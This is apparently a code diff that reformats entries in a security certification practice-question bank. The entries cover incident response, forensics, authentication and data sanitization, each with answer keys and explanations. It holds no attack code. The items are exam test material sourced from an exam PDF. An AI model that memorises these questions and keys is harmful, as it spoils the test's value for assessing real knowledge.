-    "question": "A security analyst receives a report of unusual outbound traffic from a development server at\n2:30 a.m. The server should have had no internet communication outside of business hours\nbased on normal usage.\nWhich of the following data sources will most effectively help validate whether this behavior is\npart of a potential security incident? (Choose two.)",
+    "question": "A security analyst receives a report of unusual outbound traffic from a development server at 2:30 a.m. The server should have had no internet communication outside of business hours based on normal usage.\nWhich of the following data sources will most effectively help validate whether this behavior is part of a potential security incident? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -8699,7 +8661,7 @@ export const domain4Questions = [
       "A",
       "E"
     ],
-    "explanation": "Packet captures provide detailed evidence of the actual network communication, including\ndestination, protocol, payload metadata, and timing. Firewall traffic logs help validate whether\nthe development server made outbound connections at 2:30 a.m., where the traffic went, and\nwhether it violated expected network behavior.",
+    "explanation": "Packet captures provide detailed evidence of the actual network communication, including destination, protocol, payload metadata, and timing. Firewall traffic logs help validate whether the development server made outbound connections at 2:30 a.m., where the traffic went, and whether it violated expected network behavior.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8737,7 +8699,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "The log entry shows a database query embedded in the web request, which indicates a likely\nSQL injection attempt. This activity is associated with the IP address shown for that request.",
+    "explanation": "The log entry shows a database query embedded in the web request, which indicates a likely SQL injection attempt. This activity is associated with the IP address shown for that request.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8753,7 +8715,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "Staff members at a company historically click on dangerous links. The leadership team wants to\nreduce that risk.\nWhich of the following should a security engineer do to help reduce future incidents?",
+    "question": "Staff members at a company historically click on dangerous links. The leadership team wants to reduce that risk.\nWhich of the following should a security engineer do to help reduce future incidents?",
     "choices": [
       {
         "key": "A",
@@ -8775,7 +8737,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A realistic phishing email test combined with refresher training helps employees recognize\ndangerous links and reinforces safer behavior. This directly addresses the historical pattern of\nusers clicking malicious links.",
+    "explanation": "A realistic phishing email test combined with refresher training helps employees recognize dangerous links and reinforces safer behavior. This directly addresses the historical pattern of users clicking malicious links.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8791,7 +8753,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A wireless administrator sets up a new network in a small office using a password. The network\nmust reduce the impact of brute-force attacks if the password is subjected to over-the-air\ninterception.\nWhich of the following security settings will help achieve this goal?",
+    "question": "A wireless administrator sets up a new network in a small office using a password. The network must reduce the impact of brute-force attacks if the password is subjected to over-the-air interception.\nWhich of the following security settings will help achieve this goal?",
     "choices": [
       {
         "key": "A",
@@ -8813,7 +8775,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Simultaneous Authentication of Equals strengthens WPA3-Personal authentication by making\nintercepted wireless handshakes resistant to offline brute-force password attacks. This reduces\nthe impact if authentication traffic is captured over the air.",
+    "explanation": "Simultaneous Authentication of Equals strengthens WPA3-Personal authentication by making intercepted wireless handshakes resistant to offline brute-force password attacks. This reduces the impact if authentication traffic is captured over the air.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8829,7 +8791,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A Chief Information Security Officer (CISO) implements a new policy that users can no longer\naccess fantasy sports sites while at work. The CISO wants to implement a solution that can\nadapt to new sites coming online and not have to constantly determine which sites are related to\nfantasy sports.\nWhich of the following is the best capability for the CISO to leverage?",
+    "question": "A Chief Information Security Officer (CISO) implements a new policy that users can no longer access fantasy sports sites while at work. The CISO wants to implement a solution that can adapt to new sites coming online and not have to constantly determine which sites are related to fantasy sports.\nWhich of the following is the best capability for the CISO to leverage?",
     "choices": [
       {
         "key": "A",
@@ -8855,7 +8817,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Content categorization groups websites by type, such as gambling, sports, games, or fantasy\nsports-related content. This allows filtering policies to adapt as new sites appear without\nrequiring the CISO to manually maintain a static list of every site.",
+    "explanation": "Content categorization groups websites by type, such as gambling, sports, games, or fantasy sports-related content. This allows filtering policies to adapt as new sites appear without requiring the CISO to manually maintain a static list of every site.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8893,7 +8855,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Threat hunting uses known indicators of compromise to proactively search the environment for\nsigns of malicious activity. This helps determine whether systems have already been affected by\nthe threat described in the bulletin.",
+    "explanation": "Threat hunting uses known indicators of compromise to proactively search the environment for signs of malicious activity. This helps determine whether systems have already been affected by the threat described in the bulletin.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8931,7 +8893,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Data sanitization is primarily performed during recovery to ensure affected systems, storage, or\nmedia are cleaned before being restored to normal operation. This helps prevent compromised\nor residual data from reintroducing risk after an incident.",
+    "explanation": "Data sanitization is primarily performed during recovery to ensure affected systems, storage, or media are cleaned before being restored to normal operation. This helps prevent compromised or residual data from reintroducing risk after an incident.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8947,7 +8909,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "Which of the following is the best process to follow before the disposal of solid state drives\n(SSDs) and hard disk drives (HDDs) to ensure data cannot be recovered?",
+    "question": "Which of the following is the best process to follow before the disposal of solid state drives (SSDs) and hard disk drives (HDDs) to ensure data cannot be recovered?",
     "choices": [
       {
         "key": "A",
@@ -8969,7 +8931,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Sanitizing or wiping removes accessible data, degaussing is effective for magnetic hard drives,\nand shredding provides physical destruction. Using these disposal methods ensures data on\nSSDs and HDDs cannot be recovered after the drives are retired.",
+    "explanation": "Sanitizing or wiping removes accessible data, degaussing is effective for magnetic hard drives, and shredding provides physical destruction. Using these disposal methods ensures data on SSDs and HDDs cannot be recovered after the drives are retired.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8985,7 +8947,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security administrator investigates an actively compromised server.\nWhich of the following should the administrator do first to preserve the current state of the\nserver?",
+    "question": "A security administrator investigates an actively compromised server.\nWhich of the following should the administrator do first to preserve the current state of the server?",
     "choices": [
       {
         "key": "A",
@@ -9007,7 +8969,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A bit-level copy creates a forensic image of the server's storage, preserving allocated data,\ndeleted data, file-system metadata, and unallocated space for later analysis without altering the\noriginal evidence.",
+    "explanation": "A bit-level copy creates a forensic image of the server's storage, preserving allocated data, deleted data, file-system metadata, and unallocated space for later analysis without altering the original evidence.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9023,7 +8985,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following is most important to maintain when it comes to evidence during a digital\nforensic investigation?",
+    "question": "Which of the following is most important to maintain when it comes to evidence during a digital forensic investigation?",
     "choices": [
       {
         "key": "A",
@@ -9045,7 +9007,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Chain of custody documents how evidence is collected, handled, transferred, stored, and\naccessed throughout an investigation. Maintaining it preserves the integrity and traceability of\nevidence and helps demonstrate that the evidence has not been altered or improperly handled.",
+    "explanation": "Chain of custody documents how evidence is collected, handled, transferred, stored, and accessed throughout an investigation. Maintaining it preserves the integrity and traceability of evidence and helps demonstrate that the evidence has not been altered or improperly handled.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9056,54 +9018,12 @@ export const domain4Questions = [
     "keyCorrected": false
   },
   {
-    "id": "q0968",
-    "domain": 4,
-    "objective": "4.2",
-    "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
-    "type": "single",
-    "question": "Which of the following is the best way to sanitize an SSD to prevent the exposure of sensitive\ndata while allowing the drive to be reused?",
-    "choices": [
-      {
-        "key": "A",
-        "text": "Secure erasing"
-      },
-      {
-        "key": "B",
-        "text": "Degaussing"
-      },
-      {
-        "key": "C",
-        "text": "Formatting"
-      },
-      {
-        "key": "D",
-        "text": "File wiping"
-      },
-      {
-        "key": "E",
-        "text": "Encrypting"
-      }
-    ],
-    "correct": [
-      "A"
-    ],
-    "explanation": "Secure erasing is the appropriate sanitization method for an SSD because it removes stored\ndata across the drive, including areas that normal file deletion or formatting may not reliably\nclear, while keeping the device usable for reuse.",
-    "explanationSource": "pdf",
-    "incorrectExplanations": {},
-    "references": [],
-    "source": "SY0-701_en.pdf#p406",
-    "needsReview": true,
-    "inferenceConfidence": 1.0,
-    "needsExplanation": false,
-    "keyCorrected": false
-  },
-  {
     "id": "q0970",
     "domain": 4,
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A software company currently secures access using a combination of traditional\nusername/password configurations and one-time passwords for MFA. However, employees still\nstruggle to maintain both a password manager and the authenticator application. The company\nwants to migrate to a single, integrated authentication solution that is more secure and provides\na smoother login experience for its employees.\nWhich of the following solutions will best satisfy the company's needs?",
+    "question": "A software company currently secures access using a combination of traditional username/password configurations and one-time passwords for MFA. However, employees still struggle to maintain both a password manager and the authenticator application. The company wants to migrate to a single, integrated authentication solution that is more secure and provides a smoother login experience for its employees.\nWhich of the following solutions will best satisfy the company's needs?",
     "choices": [
       {
         "key": "A",
@@ -9125,7 +9045,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "FIDO2 passkeys provide passwordless, phishing-resistant authentication using public-key\ncryptography and can integrate with built-in device biometrics. This removes the need to\nmanage separate passwords and authenticator-generated codes while improving both security\nand the employee login experience.",
+    "explanation": "FIDO2 passkeys provide passwordless, phishing-resistant authentication using public-key cryptography and can integrate with built-in device biometrics. This removes the need to manage separate passwords and authenticator-generated codes while improving both security and the employee login experience.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9163,7 +9083,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Acquisition is the forensic investigation stage in which data is collected and forensic images are\ncreated from storage media or other digital sources. The goal is to obtain an accurate copy of\nthe original evidence for subsequent examination and analysis.",
+    "explanation": "Acquisition is the forensic investigation stage in which data is collected and forensic images are created from storage media or other digital sources. The goal is to obtain an accurate copy of the original evidence for subsequent examination and analysis.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9179,7 +9099,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A user's account is flagged for accessing internal servers from multiple countries within a 30-\nminute period. The user reports they were at the office during that time.\nWhich of the following does this activity most likely indicate?",
+    "question": "A user's account is flagged for accessing internal servers from multiple countries within a 30- minute period. The user reports they were at the office during that time.\nWhich of the following does this activity most likely indicate?",
     "choices": [
       {
         "key": "A",
@@ -9201,7 +9121,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Logins from multiple countries within a very short period indicate impossible travel, a common\nsign of credential compromise. Since the user confirms being at the office, the activity strongly\nsuggests an attacker is using the account from other locations.",
+    "explanation": "Logins from multiple countries within a very short period indicate impossible travel, a common sign of credential compromise. Since the user confirms being at the office, the activity strongly suggests an attacker is using the account from other locations.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9217,7 +9137,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "An organization wants to implement an SSO solution that will fulfill the following requirements:\n• Must not restrict the organization to a single vendor • Must facilitate federated identity\nmanagement • Must not require continuous user account synchronization across network\ndirectories\nWhich of the following technologies should be part of the solution?",
+    "question": "An organization wants to implement an SSO solution that will fulfill the following requirements:\n• Must not restrict the organization to a single vendor • Must facilitate federated identity management • Must not require continuous user account synchronization across network directories Which of the following technologies should be part of the solution?",
     "choices": [
       {
         "key": "A",
@@ -9239,7 +9159,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "SAML is an open standard designed for federated identity and web-based single sign-on. It\nallows organizations to exchange authentication and authorization information between\nindependent identity providers and service providers without requiring continuous\nsynchronization of user accounts across separate directories.",
+    "explanation": "SAML is an open standard designed for federated identity and web-based single sign-on. It allows organizations to exchange authentication and authorization information between independent identity providers and service providers without requiring continuous synchronization of user accounts across separate directories.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9255,7 +9175,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "A popular, third-party cryptographic library receives a security advisory. A company's security\nmanager directs the security team to determine if their new human resources application\ncontains the affected library.\nWhich of the following should the security team use?",
+    "question": "A popular, third-party cryptographic library receives a security advisory. A company's security manager directs the security team to determine if their new human resources application contains the affected library.\nWhich of the following should the security team use?",
     "choices": [
       {
         "key": "A",
@@ -9277,7 +9197,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Software composition analysis identifies third-party and open-source components used within\nan application and compares them against known vulnerability information. It is therefore the\nappropriate method for determining whether the HR application contains the affected\ncryptographic library.",
+    "explanation": "Software composition analysis identifies third-party and open-source components used within an application and compares them against known vulnerability information. It is therefore the appropriate method for determining whether the HR application contains the affected cryptographic library.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -9293,7 +9213,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security administrator receives an email regarding a newly disclosed exploit. The\nadministrator is unsure if the exploit is affecting the company.\nWhich of the following actions should the security administrator take?",
+    "question": "A security administrator receives an email regarding a newly disclosed exploit. The administrator is unsure if the exploit is affecting the company.\nWhich of the following actions should the security administrator take?",
     "choices": [
       {
         "key": "A",
@@ -9315,7 +9235,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "A vulnerability scan can determine whether systems within the organization contain the\nvulnerability associated with the newly disclosed exploit. This provides a safe, systematic way to\nidentify affected assets and determine whether remediation is required.",
+    "explanation": "A vulnerability scan can determine whether systems within the organization contain the vulnerability associated with the newly disclosed exploit. This provides a safe, systematic way to identify affected assets and determine whether remediation is required.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
